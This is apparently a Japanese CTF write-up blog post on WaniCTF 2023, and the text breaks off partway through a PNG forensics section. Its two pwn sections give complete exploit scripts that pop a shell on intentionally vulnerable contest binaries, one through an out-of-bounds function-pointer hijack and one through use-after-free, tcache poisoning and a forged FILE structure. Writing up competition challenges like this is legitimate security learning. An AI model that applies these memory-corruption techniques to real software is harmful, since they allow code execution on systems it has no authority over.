---
title: WaniCTF 2023のWriteup
url: https://ptr-yudai.hatenablog.com/entry/2023/05/07/004235
source: CTFするぞ
date: 2023-05-07
fetch_date: 2025-10-04T11:37:54.804152
---

# WaniCTF 2023のWriteup

[![CTFするぞ](https://cdn.image.st-hatena.com/image/square/994ee0e012cf90178bff014bfd99123c02a89b36/backend=imagemagick;height=128;version=1;width=128/https%3A%2F%2Fcdn.user.blog.st-hatena.com%2Fblog_custom_icon%2F153103571%2F1535456424487441)](https://ptr-yudai.hatenablog.com/)

[CTFするぞ](https://ptr-yudai.hatenablog.com/)

[読者になる](https://blog.hatena.ne.jp/ptr-yudai/ptr-yudai.hatenablog.com/subscribe?utm_campaign=subscribe_blog&utm_source=blogs_topright_button&utm_medium=button)

# [CTFするぞ](https://ptr-yudai.hatenablog.com/)

## CTF以外のことも書くよ

[2023-05-07](https://ptr-yudai.hatenablog.com/archive/2023/05/07)

# [WaniCTF 2023のWriteup](https://ptr-yudai.hatenablog.com/entry/2023/05/07/004235)

[CTF](https://ptr-yudai.hatenablog.com/archive/category/CTF)
[Writeup](https://ptr-yudai.hatenablog.com/archive/category/Writeup)

# はじめに

今年もWaniCTFがやってきました。
今回はチーム戦ありとのことで、GWで予定が詰まっていたので[st98](https://twitter.com/st98_/)🦌 + [theoremoon](https://twitter.com/theoremoon)👻たちと一緒に初日で全完させる気持ちで出ました。
チーム名は「ℹ️❤️🐏」で出て、無事12時間以内にすべてを終わらせて登山に向けて3時間睡眠が取れました。

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20230506/20230506235518.jpg)

進撃のyoshikingが山を通った跡

![](https://cdn-ak.f.st-hatena.com/images/fotolife/p/ptr-yudai/20230507/20230507004517.png)

OSCPよりかっこいい証明書

↓こっちを読もう↓

[nanimokangaeteinai.hateblo.jp](https://nanimokangaeteinai.hateblo.jp/entry/2023/05/06/165007)

問題数が多いので各ジャンル点数の高いものだけ書きます。

* [はじめに](#はじめに)
* [[Pwn] Time Table](#Pwn-Time-Table)
* [[Pwn] Copy & Paste](#Pwn-Copy--Paste)
* [[Forensics] Apocalypse](#Forensics-Apocalypse)
* [[Misc] int\_generator](#Misc-int_generator)
* [[Misc] range\_xor](#Misc-range_xor)

# [Pwn] Time Table

時間割管理アプリのようです。機能がごちゃごちゃしていて[脆弱性](https://d.hatena.ne.jp/keyword/%EF%BF%BD%C8%BC%EF%BF%BD%EF%BF%BD%EF%BF%BD)はいくつかありますが、範囲外参照[脆弱性](https://d.hatena.ne.jp/keyword/%EF%BF%BD%C8%BC%EF%BF%BD%EF%BF%BD%EF%BF%BD)が一番自明かつ強そうなので注目します。

```
void register_mandatory_class() {
...
  printf(">");
  scanf("%d", &i);
  choice = mandatory_list[i]; // [!] OOB

  printf("%d\n", choice.time[0]);
...

void register_elective_class() {
...
  printf(">");
  scanf("%d", &i);
  choice = elective_list[i]; // [!] OOB
  if (choice.IsAvailable(&user) == 1) {
```

PIE無効なのでアド[レスリー](https://d.hatena.ne.jp/keyword/%EF%BF%BD%EC%A5%B9%EF%BF%BD%EA%A1%BC)クにこだわらずに解けます。
`register_elective_class`の`choice.IsAvailable`が関数ポインタなので、範囲外参照でユーザー入力を関数ポインタとして認識させられれば終わります。
実際、`elective_list`よりも低いアドレスに`mandatory_list`というものがあり、

```
mandatory_subject mandatory_list[3] = {computer_system, digital_circuit,
                                       system_control};
...
elective_subject elective_list[2] = {world, intellect};
```

これの`memo`メンバーは十分に書き換え可能です。

```
typedef struct {
  char *name;
  int time[2];
  char *target[4];
  char memo[32];
  char *professor;
} mandatory_subject;
```

また、

```
  if (choice.IsAvailable(&user) == 1) {
```

の`user`はユーザー入力が入る`name`を先頭に持っているだめ、ある程度自由な値を入れられます。

```
typedef struct {
  char name[10];
  int studentNumber;
  int EnglishScore;
} student;
```

1回目に`IsAvailable`に`printf`をセットし、[FSB](https://d.hatena.ne.jp/keyword/FSB)でlibcのアドレスをリークし、2回目に`system`でシェルを呼べば終わります。

```
from ptrlib import *

def reg_m(index):
    sock.sendlineafter(">", "1")
    sock.sendlineafter(">", index)
def reg_s(index):
    sock.sendlineafter(">", "2")
    sock.sendlineafter(">", index)
def memo(date, data):
    sock.sendlineafter(">", "4")
    sock.sendlineafter(">", date)
    sock.sendafter("CLASS\n", data)

libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF("./chall")
#sock = Process("./chall")
sock = Socket("nc timetable-pwn.wanictf.org 9008")

sock.sendafter(": ", "%49$p;sh\0")
sock.sendlineafter(": ", "+")
sock.sendlineafter(": ", "+")

reg_m(1)
memo("FRI 3", b"A"*0x10+p64(elf.plt("printf")))
reg_s(-3)
l = sock.recvline()
libc.base = int(l[:l.find(b";")], 16) - 0x29e40

memo("FRI 3", b"A"*0x10+p64(libc.symbol("system")))
reg_s(-3)

sock.sh()
```

# [Pwn] Copy & Paste

ヒープ問です。noteをコピーして別のnoteと結合できます。

```
void copy() {
...
  copied = list[idx];
  printf("Done!\n");
}

void paste() {
...
  pasted.size = list[idx].size + copied.size;
  if (pasted.size < 0 || pasted.size > MAX_NOTE_SIZE) {
    printf("Invalid size!\nPaste failed!\n");
    return;
  }
  pasted.ptr = (char *)malloc(pasted.size);
  memset(pasted.ptr, 0, pasted.size);
  sprintf(pasted.ptr, "%s%s", list[idx].ptr, copied.ptr);
  free(list[idx].ptr);
  list[idx] = pasted;
  printf("Done!\n");
}
```

また、noteの削除もできます。

```
void delete () {
...
  free(list[idx].ptr);
  list[idx].size = 0;
  list[idx].ptr = NULL;
  printf("Done!\n");
}
```

コピーしたnoteはdeleteで触れられていないので、明らかにUse-after-Freeが起きています。
コピーしておいたnoteを削除してからペーストすると、free時に挿入されたアドレスがsprintfで結合されるため、別のnoteからアド[レスリー](https://d.hatena.ne.jp/keyword/%EF%BF%BD%EC%A5%B9%EF%BF%BD%EA%A1%BC)クできます。
まずはlibcとヒープのアドレスを取っておきましょう。

また、Use-after-Freeが起きているということは、ペースト時のサイズ情報も間違っていることになります。
小さいnoteをfreeして、同じアドレスにより長いデータが重なるようにチャンクを確保すれば、`sprintf`で想定よりも多い値がコピーされます。

NULLバイトがコピーできないのでサイズ情報を書き換えても安全なtcache poisoningを使うのが楽です。
あとは適当にFILE構造体を書き換えるなどしてシェルを取ります。

```
from ptrlib import *

def create(index, size, data):
    assert 0 <= size <= 4096
    assert len(data) <= size
    sock.sendlineafter("choice: ", 1)
    sock.sendlineafter("index: ", index)
    sock.sendlineafter("): ", size)
    sock.sendafter("content: ", data)
def show(index):
    sock.sendlineafter(": ", 2)
    sock.sendlineafter(": ", index)
    return sock.recvline()
def copy(index):
    sock.sendlineafter(": ", 3)
    sock.sendlineafter(": ", index)
def paste(index):
    sock.sendlineafter(": ", 4)
    sock.sendlineafter(": ", index)
def delete(index):
    sock.sendlineafter(": ", 5)
    sock.sendlineafter(": ", index)

libc = ELF("libc.so.6")
#sock = Process("./chall")
sock = Socket("nc copy-paste-pwn.wanictf.org 9009")

# leak libc
create(0, 0x428, b"Hello")
create(1, 0x18, b"A")
copy(0)
delete(0)
paste(1)
libc.base = u64(show(1)[1:]) - libc.main_arena() - 0x450

# leak heap
create(0, 0x28, b"Hello")
copy(0)
delete(0)
paste(1)
heap_base = u64(show(1)[1+6:]) << 12
logger.info("heap = " + hex(heap_base))

# tcache poisoning
for i in range(7):
    create(1, 0x108, b"A"*0x108)
create(2, 0xe8, b"A"*0xe0)
create(3, 0xe8, b"B"*0xe0)
create(0, 0x528, b"C"*0x520)
copy(0)
delete(0)

target = libc.symbol("_IO_2_1_stderr_")
payload  = b"X"*0x530 + b"A"*0x6
payload += p64(((heap_base+0x2c70) >> 12) ^ target)
create(4, 0x7f8, payload)
create(5, 0x528, b"Y"*0x528)
create(9, 0x528, b"dummy")
create(6, 0xa58, b"Hello")
create(7, 0xe8, b"1"*0xe0)
delete(2)
delete(3)
delete(7)
delete(6)
paste(5)

create(2, 0xe8, "dummy")

addr_IO_wfile_jumps = libc.base + 0x2160c0
fake_file = flat([
    0x3b01010101010101, u64(b"/bin/sh\0"), # flags / rptr
    0, 0, # rend / rbase
    0, 1, # wbase / wptr
    0, 0, # wend / bbase
    0, 0, # bend / savebase
    0, 0, # backupbase / saveend
    0, 0, # marker / chain
], map=p64)
fake_file += p64(libc.symbol("system")) # __doallocate
fake_file += b'\x00' * (0x88 - len(fake_file))
fake_file += p64(libc.base + 0x21ba70) # lock
fake_file += b'\x00' * (0xa0 - len(fake_file))
fake_file += p64(libc.symbol("_IO_2_1_stderr_")) # wide_data
fake_file += b'\x00' * (0xc0 - len(fake_file))
fake_file += b'\xff\xff\xff\xff'
fake_file += b'\x00' * (0xd8 - len(fake_file))
fake_file += p64(libc.base + 0x2160c0 - 0x58 + 0x18) # vtable (_IO_wfile_jumps)
fake_file += p64(libc.symbol("_IO_2_1_stderr_") + 8) # _wide_data->_wide_vtable
create(3, 0xe8, fake_file)

sock.sendline("6")

sock.sh()
```

# [Forensics] Apocalypse

問題名から絶対aCropalypseだと思ったら違いました。
開けない[PNG](https://d.hatena.ne.jp/keyword/PNG)ファイルが渡されるので調べると、データの途中にIENDチャンクが挿入されていました。
なぜそこにIENDチャンクがあるのか本当にわからなかったのですが、なぜかIENDチャンクがありました。

そういう日もあるのでIDATを取り出して強制的にdecompressしようとしましたが、[python](https://d.hatena.ne.jp/keyword/python)のzlibはエラー耐性が貧弱で使い物になりませんでした。
代わりにzlib-flateで展開して[GIMP](https://d.hatena.ne.jp/keyword/GIMP)で開くと、それっぽいフラグが出ました。

```
import struct
import binascii
import zlib
import os
from ptrlib import *
from PIL import Image

data = b""
with open("chall.png", ...